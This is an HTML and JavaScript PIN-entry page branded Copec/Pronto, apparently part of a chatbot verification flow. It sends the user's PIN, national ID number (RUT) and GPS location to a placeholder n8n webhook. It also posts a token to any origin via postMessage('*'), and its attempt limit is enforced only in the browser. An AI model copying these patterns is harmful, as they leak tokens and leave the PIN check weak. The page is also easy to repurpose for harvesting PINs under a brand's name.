<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validaci√≥n PIN - Copec/Pronto</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
            position: relative;
        }

        .logo {
            width: 80px;
            height: 80px;
            background: #007bff;
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: bold;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .pin-container {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
        }

        .pin-input {
            width: 60px;
            height: 60px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 24px;
            text-align: center;
            font-weight: bold;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }

        .pin-input:focus {
            outline: none;
            border-color: #007bff;
            background: white;
            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
        }

        .pin-input.filled {
            border-color: #28a745;
            background: #f8fff9;
        }

        .pin-input.error {
            border-color: #dc3545;
            background: #fff8f8;
            animation: shake 0.5s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }

        .key {
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }

        .key:hover {
            background: #e9ecef;
            border-color: #007bff;
        }

        .key:active {
            transform: scale(0.95);
        }

        .key.special {
            background: #dc3545;
            color: white;
            border-color: #dc3545;
        }

        .key.special:hover {
            background: #c82333;
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }

        .submit-btn:hover {
            background: #0056b3;
        }

        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        .success-message {
            color: #28a745;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        .attempts-left {
            color: #ffc107;
            font-size: 12px;
            margin-top: 10px;
        }

        .security-notice {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            font-size: 12px;
            color: #856404;
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
            
            .pin-input {
                width: 50px;
                height: 50px;
                font-size: 20px;
            }
            
            .keypad {
                gap: 10px;
            }
            
            .key {
                padding: 12px;
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîí</div>
        <h1>Validaci√≥n de Seguridad</h1>
        <p class="subtitle">Ingresa tu PIN de 4 d√≠gitos para continuar</p>
        
        <div class="pin-container">
            <input type="password" class="pin-input" maxlength="1" readonly>
            <input type="password" class="pin-input" maxlength="1" readonly>
            <input type="password" class="pin-input" maxlength="1" readonly>
            <input type="password" class="pin-input" maxlength="1" readonly>
        </div>

        <div class="keypad">
            <button class="key" onclick="addDigit('1')">1</button>
            <button class="key" onclick="addDigit('2')">2</button>
            <button class="key" onclick="addDigit('3')">3</button>
            <button class="key" onclick="addDigit('4')">4</button>
            <button class="key" onclick="addDigit('5')">5</button>
            <button class="key" onclick="addDigit('6')">6</button>
            <button class="key" onclick="addDigit('7')">7</button>
            <button class="key" onclick="addDigit('8')">8</button>
            <button class="key" onclick="addDigit('9')">9</button>
            <button class="key special" onclick="clearPin()">‚úñ</button>
            <button class="key" onclick="addDigit('0')">0</button>
            <button class="key special" onclick="deleteDigit()">‚å´</button>
        </div>

        <button class="submit-btn" onclick="validatePin()" disabled>Validar PIN</button>
        
        <div class="loading">
            <div class="spinner"></div>
            <p>Validando...</p>
        </div>

        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>
        <div class="attempts-left" id="attemptsLeft">Intentos restantes: 3</div>

        <div class="security-notice">
            <strong>üõ°Ô∏è Aviso de Seguridad:</strong><br>
            Este sistema est√° protegido por m√∫ltiples capas de seguridad. Todos los intentos de acceso son monitoreados y registrados.
        </div>
    </div>

    <script>
        let currentPin = '';
        let attemptsLeft = 3;
        let isBlocked = false;

        // Obtener par√°metros de URL
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');
        const rut = urlParams.get('rut');
        const nivel = urlParams.get('nivel') || '1';

        // Detectar ubicaci√≥n para verificaci√≥n GPS
        let userLocation = null;
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLocation = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude
                    };
                    console.log('Ubicaci√≥n obtenida:', userLocation);
                },
                (error) => {
                    console.warn('No se pudo obtener la ubicaci√≥n:', error);
                }
            );
        }

        function addDigit(digit) {
            if (isBlocked || currentPin.length >= 4) return;
            
            currentPin += digit;
            updatePinDisplay();
            
            if (currentPin.length === 4) {
                document.querySelector('.submit-btn').disabled = false;
            }
        }

        function deleteDigit() {
            if (isBlocked || currentPin.length === 0) return;
            
            currentPin = currentPin.slice(0, -1);
            updatePinDisplay();
            document.querySelector('.submit-btn').disabled = currentPin.length !== 4;
        }

        function clearPin() {
            if (isBlocked) return;
            
            currentPin = '';
            updatePinDisplay();
            document.querySelector('.submit-btn').disabled = true;
            clearMessages();
        }

        function updatePinDisplay() {
            const inputs = document.querySelectorAll('.pin-input');
            inputs.forEach((input, index) => {
                input.value = index < currentPin.length ? '‚óè' : '';
                input.className = 'pin-input' + (index < currentPin.length ? ' filled' : '');
            });
        }

        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            
            // Efecto de shake en los inputs
            document.querySelectorAll('.pin-input').forEach(input => {
                input.classList.add('error');
                setTimeout(() => input.classList.remove('error'), 500);
            });
        }

        function showSuccess(message) {
            const successDiv = document.getElementById('successMessage');
            successDiv.textContent = message;
            successDiv.style.display = 'block';
        }

        function clearMessages() {
            document.getElementById('errorMessage').style.display = 'none';
            document.getElementById('successMessage').style.display = 'none';
        }

        function updateAttemptsLeft() {
            const attemptsDiv = document.getElementById('attemptsLeft');
            attemptsDiv.textContent = `Intentos restantes: ${attemptsLeft}`;
            
            if (attemptsLeft <= 1) {
                attemptsDiv.style.color = '#dc3545';
            }
        }

        function blockAccess() {
            isBlocked = true;
            document.querySelector('.submit-btn').disabled = true;
            document.querySelectorAll('.key').forEach(key => {
                key.style.opacity = '0.5';
                key.style.cursor = 'not-allowed';
            });
            
            showError('Acceso bloqueado. Contacta al administrador.');
        }

        async function validatePin() {
            if (!currentPin || currentPin.length !== 4) {
                showError('Ingresa un PIN de 4 d√≠gitos');
                return;
            }

            // Mostrar loading
            document.querySelector('.loading').style.display = 'block';
            document.querySelector('.submit-btn').disabled = true;

            try {
                // Validar PIN con el webhook de n8n
                const response = await fetch('https://tu-webhook-n8n.com/validar-pin', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chatId: chatId,
                        rut: rut,
                        pin: currentPin,
                        nivel: nivel,
                        location: userLocation,
                        timestamp: new Date().toISOString()
                    })
                });

                const result = await response.json();
                
                if (result.success) {
                    showSuccess('PIN validado correctamente');
                    
                    // Redireccionar seg√∫n el nivel
                    if (nivel === '2' || nivel === '3') {
                        // Ir a validaci√≥n biom√©trica
                        setTimeout(() => {
                            window.location.href = `biometria.html?chatId=${chatId}&rut=${rut}&nivel=${nivel}&pinToken=${result.pinToken}`;
                        }, 1500);
                    } else {
                        // Nivel 1: Cerrar ventana y continuar
                        setTimeout(() => {
                            window.close();
                            // Notificar al bot que puede continuar
                            window.parent.postMessage({
                                type: 'PIN_VALIDATED',
                                chatId: chatId,
                                nivel: nivel,
                                token: result.token
                            }, '*');
                        }, 1500);
                    }
                } else {
                    attemptsLeft--;
                    updateAttemptsLeft();
                    
                    if (attemptsLeft <= 0) {
                        blockAccess();
                    } else {
                        showError(result.message || 'PIN incorrecto');
                        currentPin = '';
                        updatePinDisplay();
                    }
                }
            } catch (error) {
                console.error('Error validando PIN:', error);
                showError('Error de conexi√≥n. Intenta nuevamente.');
            } finally {
                document.querySelector('.loading').style.display = 'none';
                document.querySelector('.submit-btn').disabled = false;
            }
        }

        // Prevenir copiar/pegar
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && (e.key === 'c' || e.key === 'v' || e.key === 'a')) {
                e.preventDefault();
            }
        });

        // Prevenir click derecho
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
        });

        // Prevenir selecci√≥n de texto
        document.addEventListener('selectstart', (e) => {
            e.preventDefault();
        });

        // Auto-focus al cargar
        window.addEventListener('load', () => {
            document.querySelector('.keypad').focus();
        });
    </script>
</body>
</html>
